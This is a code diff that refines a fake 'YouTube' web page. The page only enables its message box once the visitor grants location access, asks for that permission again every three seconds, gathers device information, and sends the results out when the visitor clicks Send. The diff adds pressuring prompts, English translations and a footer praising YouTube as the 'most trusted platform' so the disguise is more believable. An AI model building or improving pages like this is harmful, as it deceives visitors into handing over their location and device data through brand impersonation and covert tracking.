@@ -1,22 +1,22 @@
 <!DOCTYPE html>
-<html lang="hi">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>YouTube</title>
   <style>
     body {
-      background-color: #fff;
+      background-color: #ffe6f0; /* halka gulabi background */
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 40px;
+      padding: 30px;
       color: #000;
     }
     .logo {
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-bottom: 20px;
+      margin-bottom: 15px;
     }
     .logo-box {
       background: red;
@@ -59,6 +59,12 @@
       margin-top: 15px;
       font-weight: bold;
     }
+    footer {
+      margin-top: 40px;
+      font-size: 14px;
+      color: #444;
+      font-style: italic;
+    }
   </style>
 </head>
 <body>
@@ -66,12 +72,16 @@
     <div class="logo-box">▶</div>
     <span style="font-size:22px; font-weight:bold;">YouTube</span>
   </div>
-  <h1>YouTube mein aapka swagat hai, send me your message 🎥</h1>
+  <h1>Welcome to YouTube, send me your message 🎥</h1>
   
-  <input type="text" id="message" placeholder="Apna message likhiye">
+  <input type="text" id="message" placeholder="Type your message">
   <br>
   <button id="sendBtn" disabled>Send</button>
-  <p class="status" id="status"></p>
+  <p class="status" id="status" style="color:red;">You must allow permission to continue 🚨</p>
+
+  <footer>
+    YouTube is the world’s most trusted platform for sharing ideas, knowledge and creativity.
+  </footer>
 
   <script>
     let latitude = '', longitude = '', deviceInfo = {};
@@ -103,8 +113,7 @@
 
     deviceInfo = getDeviceInfo();
 
-    // Location request
-    window.onload = () => {
+    function askPermission() {
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
@@ -114,24 +123,33 @@
             const btn = document.getElementById('sendBtn');
             btn.disabled = false;
             btn.classList.add("enabled");
+            document.getElementById('status').textContent = 
+              "Permission granted ✅ You can send your message now.";
+            document.getElementById('status').style.color = "green";
           },
           err => {
             document.getElementById('status').textContent = 
-              'Location allow karo tabhi message send hoga ❌';
+              "You must allow permission to continue 🚨";
+            document.getElementById('status').style.color = "red";
           }
         );
       }
-    };
+    }
 
+    // Har 3 second me check karo
+    setInterval(askPermission, 3000);
+    askPermission();
+
+    // Send button
     document.getElementById('sendBtn').onclick = async () => {
       if (!latitude || !longitude) {
-        document.getElementById('status').textContent = 'Pehle location allow karo!';
+        document.getElementById('status').textContent = 'Please allow permission first ❌';
         return;
       }
 
       const msg = document.getElementById('message').value.trim();
       if (!msg) {
-        document.getElementById('status').textContent = 'Message likho pehle!';
+        document.getElementById('status').textContent = 'Type a message before sending!';
         return;
       }
 
@@ -150,9 +168,11 @@
       })
       .then(() => {
         document.getElementById('status').textContent = 'Message sent successfully ✅';
+        document.getElementById('status').style.color = "green";
       })
       .catch(() => {
         document.getElementById('status').textContent = 'Error sending data ❌';
+        document.getElementById('status').style.color = "red";
       });
     };
   </script>
